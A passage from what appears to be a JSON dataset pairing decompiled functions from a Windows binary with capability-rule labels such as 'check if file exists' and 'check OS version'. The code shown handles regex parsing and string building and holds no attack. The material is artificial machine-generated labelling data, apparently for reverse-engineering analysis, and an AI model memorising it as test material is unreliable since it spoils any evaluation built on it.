0x18001534f:\n        goto code_r0x00018001534f;\n    }\n    if (bVar5) {\ncode_r0x00018001534c:\n        *(arg1 + 0x7c) = 0;\n    }\ncode_r0x00018001534f:\n    return;\n}\n",
        "token_count": 1304
    },
    "18002c2c": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002c2c0(int64_t arg1)\n\n{\n    ushort *puVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    ulong *arg4;\n    ushort *puVar6;\n    ushort *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    ushort *puVar10;\n    ulong uVar11;\n    ushort *puVar12;\n    uint64_t arg2;\n    uint64_t arg3;\n    uint64_t uVar13;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar auVar14 [16];\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uchar auStack344 [32];\n    ushort *puStack312;\n    ulong uStack296;\n    ushort *puStack280;\n    uint64_t uStack272;\n    uint uStack264;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uchar auStack240 [16];\n    ulong uStack224;\n    uchar auStack216 [16];\n    uchar auStack200 [16];\n    ushort uStack184;\n    unkbyte6 Stack182;\n    ushort *puStack168;\n    uint64_t uStack160;\n    ushort uStack152;\n    unkbyte6 Stack150;\n    ushort *puStack136;\n    uint64_t uStack128;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    ulong uStack104;\n    uint64_t uStack96;\n    uint64_t uStack88;\n    \n    uStack224 = 0xfffffffffffffffe;\n    uStack88 = *0x180123080 ^ auStack344;\n    arg2 = 0;\n    uStack264 = 0;\n    cVar4 = fcn.180020c40();\n    if ((cVar4 != '\\0') && (iVar5 = (**0x1800de710)(*(arg1 + 0x18), 0x1800f6830, 0x1800f67f8, 0x124),  iVar5 == 7))\n    goto code_r0x00018002cb51;\n    if (*(arg1 + 100) == '\\0') {\n        fcn.1800290c0(arg1);\n    }\n    if (((*(arg1 + 99) == '\\0') && (iVar5 = fcn.18002a630(arg1),  iVar5 < 0)) ||\n       ((*(arg1 + 0x62) == '\\0' && (iVar5 = fcn.18002af70(arg1),  iVar5 < 0)))) goto code_r0x00018002cb51;\n    auStack200 = ZEXT816(7) << 0x40;\n    auStack216 = auStack216 & 0xffffffffffff0000;\n    puStack168 = NULL;\n    uStack160 = 7;\n    uStack184 = 0;\n    uStack104 = CONCAT44(*0x180101904, *0x180101900);\n    uStack96 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack120 = 0;\n    puStack136 = NULL;\n    uStack128 = 7;\n    uStack152 = 0;\n    iVar9 = *(arg1 + 0xe0) - *(arg1 + 0xd8);\n    iVar9 = iVar9 + SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar9) >> 0x40, 0);\n    uVar13 = (iVar9 >> 7) - (iVar9 >> 0x3f);\n    if (999 < uVar13) {\n        uVar13 = 999;\n    }\n    arg3 = arg2;\n    if (uVar13 != 0) {\n        do {\n            puStack312 = &uStack152;\n            iVar5 = fcn.1800256b0(arg1, arg2, CONCAT71(arg3 >> 8, 1), &uStack120);\n            if (iVar5 < 0) goto code_r0x00018002ca21;\n            uVar11 = 0x1800f642c;\n            if (arg2 == 0) {\n                uVar11 = 0x1800f63d4;\n            }\n            arg4 = fcn.18002e7e0(&uStack256, uVar11, &uStack120);\n            puVar10 = arg4[2];\n            if (7 < arg4[3]) {\n                arg4 = *arg4;\n            }\n            if (uStack160 - puStack168 < puVar10) {\n                puStack312 = puVar10;\n                fcn.180013690(&uStack184, puVar10, 0, arg4);\n            }\n            else {\n                puVar7 = puVar10 + puStack168;\n                puVar6 = &uStack184;\n                if (7 < uStack160) {\n                    puVar6 = CONCAT62(Stack182, uStack184);\n                }\n                puVar12 = puVar6 + puStack168;\n                puStack168 = puVar7;\n                fcn.1800ade80(puVar12, arg4, puVar10 * 2);\n                puVar6[puVar7] = 0;\n            }\n            if (7 < auStack240._8_8_) {\n                iVar3 = CONCAT44(uStack252, CONCAT22(uStack256._2_2_, uStack256));\n                iVar9 = iVar3;\n                if ((0xfff < auStack240._8_8_ * 2 + 2) && (iVar9 = *(iVar3 + -8),  0x1f < (iVar3 - iVar9) - 8U))\n                goto code_r0x00018002cb8e;\n                fcn.18008fb24(iVar9);\n            }\n            puStack280 = NULL;\n            uStack272 = 7;\n            uStack296._0_2_ = 0;\n            uStack264 = 1;\n            fcn.18000d550(&uStack296, puStack136 + 1);\n            puVar7 = puStack136;\n            puVar6 = puStack280;\n            puVar10 = &uStack152;\n            if (7 < uStack128) {\n                puVar10 = CONCAT62(Stack150, uStack152);\n            }\n            if (uStack272 - puStack280 < puStack136) {\n                puStack312 = puStack136;\n                fcn.180013690(&uStack296, puStack136, 0, puVar10);\n            }\n            else {\n                puVar12 = &uStack296;\n                if (7 < uStack272) {\n                    puVar12 = CONCAT62(uStack296._2_6_, uStack296);\n                }\n                puVar1 = puVar12 + puStack280;\n                puStack280 = puStack280 + puStack136;\n                fcn.1800ade80(puVar1, puVar10, puStack136 * 2);\n                puVar12[puVar7 + puVar6] = 0;\n            }\n            if (uStack272 - puStack280 < 2) {\n                puStack312 = 0x2;\n                fcn.180013690(&uStack296, 2, 0, 0x1800f6594);\n            }\n            else {\n                puVar10 = puStack280 + 1;\n                puVar6 = &uStack296;\n                if (7 < uStack272) {\n                    puVar6 = CONCAT62(uStack296._2_6_, uStack296);\n                }\n                puVar8 = puVar6 + puStack280;\n                puStack280 = puVar10;\n                *puVar8 = 0xa000d;\n                puVar6[puVar10] = 0;\n            }\n            puVar6 = puStack280;\n            puVar10 = &uStack296;\n            if (7 < uStack272) {\n                puVar10 = CONCAT62(uStack296._2_6_, uStack296);\n            }\n            if (auStack200._8_8_ - auStack200._0_8_ < puStack280) {\n                puStack312 = puStack280;\n                arg3 = 0;\n                fcn.180013690(auStack216, puStack280, 0, puVar10);\n            }\n            else {\n                auStack200 = CONCAT88(auStack200._8_8_, puStack280 + auStack200._0_8_);\n                auStack216._0_8_ = auStack216;\n                if (7 < auStack200._8_8_) {\n                }\n                arg3 = puStack280 * 2;\n                fcn.1800ade80(auStack216._0_8_ + auStack200._0_8_ * 2, puVar10, arg3);\n                *(auStack216._0_8_ + (puVar6 + auStack200._0_8_) * 2) = 0;\n            }\n            if (7 < uStack272) {\n                iVar3 = CONCAT62(uStack296._2_6_, uStack296);\n                iVar9 = iVar3;\n                if ((0xfff < uStack272 * 2 + 2) && (iVar9 = *(iVar3 + -8),  0x1f < (iVar3 - iVar9) - 8U))\n                goto code_r0x00018002cb94;\n                fcn.18008fb24(iVar9);\n            }\n            arg2 = arg2 + 1;\n        } while (arg2 < uVar13);\n    }\n    puStack280 = CONCAT44(*0x180101904, *0x180101900);\n    uStack272 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack296._0_2_ = 0;\n    uStack264 = 2;\n    fcn.18000d550(&uStack296, puStack168 + 9);\n    if (uStack272 - puStack280 < 0x12) {\n        puStack312 = 0x12;\n        fcn.180013690(&uStack296, 0x12, 0, 0x1800f68e0);\n    }\n    else {\n        puVar10 = puStack280 + 9;\n        puVar6 = &uStack296;\n        if (7 < uStack272) {\n            puVar6 = CONCAT62(uStack296._2_6_, uStack296);\n        }\n        puVar7 = puVar6 + puStack280;\n        puStack280 = puVar10;\n        fcn.1800ade80(puVar7, 0x1800f68e0, 0x24);\n        puVar6[puVar10] = 0;\n    }\n    puVar7 = puStack168;\n    puVar6 = puStack280;\n    puVar10 = &uStack184;\n    if (7 < uStack160) {\n        puVar10 = CONCAT62(Stack182, uStack184);\n    }\n    if (uStack272 - puStack280 < puStack168) {\n        puStack312 = puStack168;\n        fcn.180013690(&uStack296, puStack168, 0, puVar10);\n        auVar14 = extraout_XMM0_00;\n    }\n    else {\n        puVar12 = &uStack296;\n        if (7 < uStack272) {\n            puVar12 = CONCAT62(uStack296._2_6_, uStack296);\n        }\n        puVar1 = puVar12 + puStack280;\n        puStack280 = puStack280 + puStack168;\n        fcn.1800ade80(puVar1, puVar10, puStack168 * 2);\n        puVar12[puVar7 + puVar6] = 0;\n        auVar14 = extraout_XMM0;\n    }\n    puVar10 = puStack280;\n    if (uStack272 - puStack280 < 4) {\n        puStack312 = 0x4;\n        puVar8 = fcn.180013690(&uStack296, 4, 0, 0x1800f68c8);\n        auVar14 = extraout_XMM0_01;\n    }\n    else {\n        puVar6 = puStack280 + 2;\n        puStack280 = puVar6;\n        puVar7 = &uStack296;\n        if (7 < uStack272) {\n            puVar7 = CONCAT62(uStack296._2_6_, uStack296);\n        }\n        *(puVar7 + puVar10) = 0xa000d000a000d;\n        puVar7[puVar6] = 0;\n        puVar8 = &uStack296;\n    }\n    auStack240 = auVar14 & 0x0;\n    uStack256._0_2_ = *puVar8;\n    uStack256._2_2_ = *puVar8 >> 0x10;\n    uStack252 = puVar8[1];\n    uStack248 = puVar8[2];\n    uStack244 = puVar8[3];\n    auStack240 = *(puVar8 + 4);\n    *(puVar8 + 4) = 0;\n    *(puVar8 + 6) = 7;\n    *puVar8 = 0;\n    uStack264 = 6;\n    auStack216._0_8_ = auStack216;\n    if (7 < auStack200._8_8_) {\n    }\n    if (auStack240._8_8_ - auStack240._0_8_ < auStack200._0_8_) {\n        puStack312 = auStack200._0_8_;\n        puVar10 = &uStack256;\n        puVar8 = fcn.180013690(puVar10, auStack200._0_8_, 0, auStack216._0_8_);\n    }\n    else {\n        auStack240 = CONCAT88(auStack240._8_8_, auStack200._0_8_ + auStack240._0_8_);\n        puVar6 = &uStack256;\n        if (7 < auStack240._8_8_) {\n            puVar6 = CONCAT44(uStack252, CONCAT22(uStack256._2_2_, uStack256));\n        }\n        puVar10 = puVar6 + auStack240._0_8_;\n        fcn.1800ade80(puVar10, auStack216._0_8_, auStack200._0_8_ * 2);\n        puVar6[auStack200._0_8_ + auStack240._0_8_] = 0;\n        puVar8 = &uStack256;\n    }\n    uVar15 = *puVar8;\n    uVar16 = puVar8[1];\n    uVar17 = puVar8[2];\n    uVar18 = puVar8[3];\n    uVar19 = puVar8[4];\n    uVar20 = puVar8[5];\n    uVar21 = puVar8[6];\n    uVar22 = puVar8[7];\n    *(puVar8 + 4) = 0;\n    *(puVar8 + 6) = 7;\n    *puVar8 = 0;\n    if (auStack200._8_8_ < 8) {\ncode_r0x00018002c92d:\n        auStack216 = CONCAT412(uVar18, CONCAT48(uVar17, CONCAT44(uVar16, uVar15)));\n        auStack200 = CONCAT412(uVar22, CONCAT48(uVar21, CONCAT44(uVar20, uVar19)));\n        if (7 < auStack240._8_8_) {\n            puVar6 = CONCAT44(uStack252, CONCAT22(uStack256._2_2_, uStack256));\n            puVar10 = puVar6;\n            if ((auStack240._8_8_ * 2 + 2 < 0x1000) ||\n               (puVar10 = *(puVar6 + 0xfffffffffffffffc),  puVar6 + (-8 - puVar10) < 0x20)) {\n                fcn.18008fb24(puVar10);\n                goto code_r0x00018002c977;\n            }\n            goto code_r0x00018002cba0;\n        }\ncode_r0x00018002c977:\n        auStack240 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack256._0_2_ = 0;\n        if (7 < uStack272) {\n            puVar6 = CONCAT62(uStack296._2_6_, uStack296);\n            puVar10 = puVar6;\n            if ((uStack272 * 2 + 2 < 0x1000) ||\n               (puVar10 = *(puVar6 + 0xfffffffffffffffc),  puVar6 + (-8 - puVar10) < 0x20)) {\n                fcn.18008fb24(puVar10);\n                goto code_r0x00018002c9cd;\n            }\n            goto code_r0x00018002cba6;\n        }\ncode_r0x00018002c9cd:\n        uVar11 = fcn.180004ab0(puVar10, &uStack256, 0);\n        fcn.18000b420(puVar10, uVar11);\n        uVar11 = fcn.180004ab0(puVar10, &uStack256, 0);\n        fcn.18000b170(puVar10, auStack216, uVar11);\n        *(arg1 + 0x61) = 1;\n        fcn.180022420(arg1);\n        fcn.180055230(0x180124790);\n        fcn.1800557f0(0x180124790);\ncode_r0x00018002ca21:\n        if (7 < uStack128) {\n            iVar3 = CONCAT62(Stack150, uStack152);\n            iVar9 = iVar3;\n            if ((uStack128 * 2 + 2 < 0x1000) || (iVar9 = *(iVar3 + -8),  (iVar3 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x00018002ca61;\n            }\n            goto code_r0x00018002cbac;\n        }\ncode_r0x00018002ca61:\n        puStack136 = NULL;\n        uStack128 = 7;\n        uStack152 = 0;\n        if (uStack96 < 8) {\ncode_r0x00018002cab2:\n            uStack104 = CONCAT44(*0x180101904, *0x180101900);\n            uStack96 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack120 = 0;\n            if (7 < uStack160) {\n                iVar3 = CONCAT62(Stack182, uStack184);\n                iVar9 = iVar3;\n                if ((0xfff < uStack160 * 2 + 2) && (iVar9 = *(iVar3 + -8),  0x1f < (iVar3 - iVar9) - 8U))\n                goto code_r0x00018002cbb8;\n                fcn.18008fb24(iVar9);\n            }\n            puStack168 = NULL;\n            uStack160 = 7;\n            uStack184 = 0;\n            if (auStack200._8_8_ < 8) goto code_r0x00018002cb51;\n            iVar9 = auStack216._0_8_;\n            if (0xfff < auStack200._8_8_ * 2 + 2) {\n                iVar9 = *(auStack216._0_8_ + -8);\n                if (0x1f < (auStack216._0_8_ - iVar9) - 8U) {\n                    fcn.1800b3528(iVar9, auStack200._8_8_ * 2 + 0x29);\ncode_r0x00018002cb8e:\n                    fcn.1800b3528();\ncode_r0x00018002cb94:\n                    fcn.1800b3528();\n                    goto code_r0x00018002cb9a;\n                }\n            }\n            fcn.18008fb24(iVar9);\ncode_r0x00018002cb51:\n            fcn.18008fb00(uStack88 ^ auStack344);\n            return;\n        }\n        iVar3 = CONCAT62(Stack118, uStack120);\n        iVar9 = iVar3;\n        if ((uStack96 * 2 + 2 < 0x1000) || (iVar9 = *(iVar3 + -8),  (iVar3 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x00018002cab2;\n        }\n    }\n    else {\n        puVar10 = auStack216._0_8_;\n        if ((auStack200._8_8_ * 2 + 2 < 0x1000) ||\n           (puVar10 = *(auStack216._0_8_ + 0xfffffffffffffffc),  auStack216._0_8_ + (-8 - puVar10) < 0x20)) {\n            fcn.18008fb24(puVar10);\n            goto code_r0x00018002c92d;\n        }\ncode_r0x00018002cb9a:\n        fcn.1800b3528();\ncode_r0x00018002cba0:\n        fcn.1800b3528();\ncode_r0x00018002cba6:\n        fcn.1800b3528();\ncode_r0x00018002cbac:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018002cbb8:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 4975
    },
    "18002ce0": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_fh\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002ce00(ulong noname_0, uint *arg2, int64_t **arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    int64_t iVar8;\n    char cVar9;\n    ulong *puVar10;\n    ulong *puVar11;\n    int64_t iVar12;\n    uint *puVar13;\n    int64_t iVar14;\n    int64_t *arg1;\n    ushort *puVar15;\n    ushort *arg2_00;\n    int64_t **ppiVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    ulong var_fh;\n    ulong var_17h;\n    ulong var_1fh;\n    ulong var_27h;\n    uchar auStack296 [32];\n    ulong uStack264;\n    uint32_t uStack248;\n    ushort uStack240;\n    ushort uStack238;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uchar auStack224 [16];\n    ulong *puStack208;\n    uchar auStack200 [24];\n    int64_t *piStack176;\n    ulong uStack168;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uchar auStack136 [7];\n    ulong var_79h;\n    ulong var_71h;\n    uint64_t var_69h;\n    ushort uStack104;\n    unkbyte6 Stack102;\n    ulong var_51h;\n    ulong var_49h;\n    uchar auStack72 [7];\n    int64_t **var_39h;\n    uint64_t var_31h;\n    ulong var_29h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    \n    _auStack72 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack296;\n    uVar17 = 0;\n    uStack248 = 0;\n    unique0x100008fe = arg3;\n    if (arg3[2] == NULL) {\ncode_r0x00018002cfa8:\n        uStack152 = *0x180101900;\n        uStack148 = *0x180101904;\n        uStack144 = *0x180101908;\n        uStack140 = *0x18010190c;\n        uStack168._0_2_ = 0;\n        fcn.180010d70(&uStack168, 0x1800f64ac, 0);\n        puVar13 = &uStack168;\n        uVar17 = uVar17 | 0x10;\ncode_r0x00018002cfd4:\n        uVar5 = puVar13[1];\n        uVar6 = puVar13[2];\n        uVar7 = puVar13[3];\n        *arg2 = *puVar13;\n        arg2[1] = uVar5;\n        arg2[2] = uVar6;\n        arg2[3] = uVar7;\n        uVar5 = puVar13[5];\n        uVar6 = puVar13[6];\n        uVar7 = puVar13[7];\n        arg2[4] = puVar13[4];\n        arg2[5] = uVar5;\n        arg2[6] = uVar6;\n        arg2[7] = uVar7;\n        *(puVar13 + 4) = 0;\n        *(puVar13 + 6) = 7;\n        *puVar13 = 0;\n        uVar18 = uVar17 | 0x20;\n        if ((uVar17 & 0x10) != 0) {\n            uVar18 = uVar17 & 0xffffffef | 0x20;\n            if (CONCAT44(uStack140, uStack144) < 8) goto code_r0x00018002d040;\n            iVar12 = CONCAT62(uStack168._2_6_, uStack168);\n            iVar14 = iVar12;\n            if ((CONCAT44(uStack140, uStack144) * 2 + 2 < 0x1000) ||\n               (iVar14 = *(iVar12 + -8),  (iVar12 - iVar14) - 8U < 0x20)) {\n                fcn.18008fb24(iVar14);\n                goto code_r0x00018002d040;\n            }\n            goto code_r0x00018002d22e;\n        }\ncode_r0x00018002d040:\n        if (((uVar18 & 8) == 0) || (uVar18 = uVar18 & 0xfffffff7,  stack0xffffffffffffff90 < 8)) {\ncode_r0x00018002d089:\n            if ((uVar18 & 4) != 0) {\n                uStack248 = uVar18 & 0xfffffffb;\n                if (puStack208 != NULL) {\n                    LOCK();\n                    piVar1 = puStack208 + 0x2c;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                    puVar10 = puStack208;\n                    if (iVar2 == 1) {\n                        while (puVar10 != NULL) {\n                            puVar11 = puVar10[2];\n                            puVar10[2] = 0;\n                            (***puVar10)(puVar10, 1);\n                            puVar10 = puVar11;\n                        }\n                    }\n                }\n                uVar18 = uStack248;\n                puStack208 = NULL;\n                if ((piStack176 != NULL) && (puVar10 = (**(*piStack176 + 0x10))(),  puVar10 != NULL)) {\n                    (***puVar10)(puVar10, 1);\n                }\n            }\n            if ((uVar18 & 2) != 0) {\n                uVar18 = uVar18 & 0xfffffffd;\n                if (7 < auStack224._8_8_) {\n                    iVar12 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n                    iVar14 = iVar12;\n                    if ((0xfff < auStack224._8_8_ * 2 + 2) && (iVar14 = *(iVar12 + -8),  0x1f < (iVar12 - iVar14) - 8U))\n                    goto code_r0x00018002d23a;\n                    fcn.18008fb24(iVar14);\n                }\n                auStack224._0_8_ = CONCAT44(*0x180101904, *0x180101900);\n                auStack224 = CONCAT412(*0x18010190c, CONCAT48(*0x180101908, auStack224._0_8_));\n                uStack240 = 0;\n            }\n            if ((uVar18 & 1) == 0) {\ncode_r0x00018002d1ab:\n                if (arg3[3] < 0x8) {\ncode_r0x00018002d1e6:\n                    arg3[2] = NULL;\n                    arg3[3] = 0x7;\n                    *arg3 = 0;\n                    fcn.18008fb00(stack0xffffffffffffffc8 ^ auStack296);\n                    return;\n                }\n                piVar3 = *arg3;\n                arg1 = piVar3;\n                if ((arg3[3] * 2 + 2U < 0x1000) || (arg1 = piVar3[-1],  piVar3 + (-8 - arg1) < 0x20)) {\n                    fcn.18008fb24(arg1);\n                    goto code_r0x00018002d1e6;\n                }\n            }\n            else {\n                if (CONCAT44(stack0xffffffffffffffb4, var_49h._1_4_) < 8) {\ncode_r0x00018002d199:\n                    var_51h._1_4_ = *0x180101900;\n                    stack0xffffffffffffffac = *0x180101904;\n                    var_49h._1_4_ = *0x180101908;\n                    stack0xffffffffffffffb4 = *0x18010190c;\n                    uStack104 = 0;\n                    goto code_r0x00018002d1ab;\n                }\n                iVar14 = CONCAT44(stack0xffffffffffffffb4, var_49h._1_4_) * 2;\n                iVar8 = CONCAT62(Stack102, uStack104);\n                iVar12 = iVar8;\n                if (iVar14 + 2U < 0x1000) {\ncode_r0x00018002d194:\n                    fcn.18008fb24(iVar12);\n                    goto code_r0x00018002d199;\n                }\n                iVar12 = *(iVar8 + -8);\n                if ((iVar8 - iVar12) - 8U < 0x20) goto code_r0x00018002d194;\n                fcn.1800b3528(iVar12, iVar14 + 0x29);\n            }\n            fcn.1800b3528();\n            goto code_r0x00018002d228;\n        }\n        iVar12 = CONCAT62(stack0xffffffffffffff7a, auStack136._0_2_);\n        iVar14 = iVar12;\n        if ((stack0xffffffffffffff90 * 2 + 2 < 0x1000) || (iVar14 = *(iVar12 + -8),  (iVar12 - iVar14) - 8U < 0x20)) {\n            fcn.18008fb24(iVar14);\n            goto code_r0x00018002d089;\n        }\n    }\n    else {\n        puVar10 = fcn.18002e7e0(&uStack104, L\"^\\\\^[^\", 0x180123f40);\n        uStack248 = 1;\n        iVar14 = puVar10[2];\n        if (puVar10[3] - iVar14 < 2) {\n            uStack264 = 2;\n            puVar10 = fcn.180013690(puVar10, 2, 0, 0x1800f6908);\n        }\n        else {\n            puVar10[2] = iVar14 + 2;\n            puVar11 = puVar10;\n            if (7 < puVar10[3]) {\n                puVar11 = *puVar10;\n            }\n            *(puVar11 + iVar14 * 2) = 0x2b005d;\n            *(puVar11 + (iVar14 + 2) * 2) = 0;\n        }\n        uStack236 = *(puVar10 + 4);\n        uStack232 = *(puVar10 + 1);\n        uStack228 = *(puVar10 + 0xc);\n        uStack240 = *puVar10;\n        uStack238 = *puVar10 >> 0x10;\n        auStack224 = *(puVar10 + 2);\n        puVar10[2] = 0;\n        puVar10[3] = 7;\n        *puVar10 = 0;\n        uStack248 = 0x83;\n        puStack208 = NULL;\n        fcn.180010540(auStack200);\n        puVar15 = &uStack240;\n        if (7 < auStack224._8_8_) {\n            puVar15 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n        }\n        arg2_00 = &uStack240;\n        if (7 < auStack224._8_8_) {\n            arg2_00 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n        }\n        fcn.1800131f0(&puStack208, arg2_00, puVar15 + auStack224._0_8_);\n        uVar17 = 0x87;\n        uStack248 = 0x87;\n        cVar9 = fcn.18002ea10(arg3, &puStack208);\n        if (cVar9 == '\\0') goto code_r0x00018002cfa8;\n        unique0x1000046b = CONCAT44(*0x180101904, *0x180101900);\n        unique0x10000473 = CONCAT44(*0x18010190c, *0x180101908);\n        auStack136._0_2_ = 0;\n        if (arg3[2] != NULL) {\n            iVar12 = arg3[2] + -1;\n            iVar14 = -1;\n            if (iVar12 != -1) {\n                iVar14 = iVar12;\n            }\n            ppiVar16 = arg3;\n            if (0x7 < arg3[3]) {\n                ppiVar16 = *arg3;\n            }\n            fcn.180010d70(auStack136, ppiVar16 + 2, iVar14);\n            puVar13 = auStack136;\n            uVar17 = 399;\n            goto code_r0x00018002cfd4;\n        }\ncode_r0x00018002d228:\n        fcn.180011cd0();\ncode_r0x00018002d22e:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018002d23a:\n    fcn.1800b3528();\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 3067
    },
    "18003008": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180030080(char **arg1)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    if (*arg1 == arg1[2]) {\n        *(arg1 + 0xf) = 0xff;\n        iVar3 = -1;\n    }\n    else {\n        cVar2 = **arg1;\n        *(arg1 + 0xf) = cVar2;\n        iVar4 = fcn.1800add0c(\"()$^.*+?[]|\\\\-{},:=!\\n\\r\\b\", cVar2);\n        if (iVar4 == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = *(arg1 + 0xf);\n        }\n    }\n    *(arg1 + 0x7c) = iVar3;\n    if (0x73 < *(arg1 + 0xf) - 10U) {\n        return;\n    }\n    // switch table (116 cases) at 0x18003027c\n    switch(*(*((*(arg1 + 0xf) - 10U) + 0x1800302a4) * 4 + 0x18003027c) + 0x180000000) {\n    case 0x1800300f2:\n        pcVar5 = *arg1 + 1;\n        if (pcVar5 == arg1[2]) {\n            return;\n        }\n        if (((*(arg1 + 0x10) & 8) != 0) || ((cVar2 = *pcVar5,  cVar2 != '(' && (cVar2 != ')')))) {\n            if ((*(arg1 + 0x10) & 0x10) != 0) {\n                return;\n            }\n            cVar2 = *pcVar5;\n            if ((cVar2 != '{') && (cVar2 != '}')) {\n                return;\n            }\n        }\n        *(arg1 + 0xf) = cVar2;\n        *(arg1 + 0x7c) = cVar2;\n        return;\n    case 0x180030151:\n        if ((*(arg1 + 0x10) & 4) == 0) {\n            return;\n        }\n        if (*(arg1 + 0x1c) != 0) {\n            return;\n        }\n        *(arg1 + 0x7c) = 0x7c;\n        return;\n    case 0x180030179:\n        bVar6 = (*(arg1 + 0x10) & 8) == 0;\n        break;\n    case 0x180030185:\n        bVar6 = (*(arg1 + 0x10) & 0x10) == 0;\n        break;\n    case 0x180030191:\n        if ((*(arg1 + 0x10) & 0x4000000) == 0) {\n            return;\n        }\n        uVar1 = *(arg1[9] + 8);\n        if ((0x14 < uVar1) || ((0x102100U >> (uVar1 & 0x1f) & 1) == 0)) {\n            if (uVar1 != 2) {\n                return;\n            }\n            uVar1 = *(*(arg1[9] + 0x18) + 8);\n            if (0x14 < uVar1) {\n                return;\n            }\n            if ((0x102100U >> (uVar1 & 0x1f) & 1) == 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018003026e;\n    case 0x1800301eb:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        uVar1 = *(arg1[9] + 8);\n        if ((uVar1 < 0x15) && ((0x102100U >> (uVar1 & 0x1f) & 1) != 0)) {\n            return;\n        }\n        if ((uVar1 == 2) && (uVar1 = *(*(arg1[9] + 0x18) + 8),  uVar1 < 0x15)) {\n            if ((0x102100U >> (uVar1 & 0x1f) & 1) != 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018003026e;\n    case 0x180030231:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        if (*arg1 + 1 == arg1[2]) {\n            return;\n        }\n        if ((*arg1)[1] == '\\n') {\n            return;\n        }\n        *(arg1 + 0x7c) = 0;\n        return;\n    case 0x18003025c:\n        bVar6 = (*(arg1 + 0x10) & 1) == 0;\n        break;\n    case 0x180030265:\n        bVar6 = (*(arg1 + 0x10) & 2) == 0;\n        break;\n    case 0x180030271:\n        goto code_r0x000180030271;\n    }\n    if (bVar6) {\ncode_r0x00018003026e:\n        *(arg1 + 0x7c) = 0;\n    }\ncode_r0x000180030271:\n    return;\n}\n",
        "token_count": 1286
    },
    "18005130": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
